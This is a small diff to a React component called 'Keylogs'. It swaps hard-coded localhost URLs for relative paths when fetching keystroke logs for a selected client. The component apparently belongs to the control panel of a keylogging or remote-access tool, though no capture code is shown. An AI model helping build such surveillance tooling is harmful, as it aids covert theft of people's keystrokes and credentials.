@@ -10,7 +10,7 @@ const Keylogs = () => {
       setData(null);
       return;
     }
-    fetch(`http://localhost:3001/keylogs/${selectedClientId}`)
+    fetch(`/keylogs/${selectedClientId}`)
       .then((res) => res.json())
       .then((res) => {
         setData(res);
@@ -23,7 +23,7 @@ const Keylogs = () => {
   React.useEffect(() => {
     function onEvent(event) {
       if (event.event === "keylogs" && event.client_id === selectedClientId) {
-        fetch(`http://localhost:3001/keylogs/${selectedClientId}`)
+        fetch(`/keylogs/${selectedClientId}`)
           .then((res) => res.json())
           .then((res) => {
             setData(res);
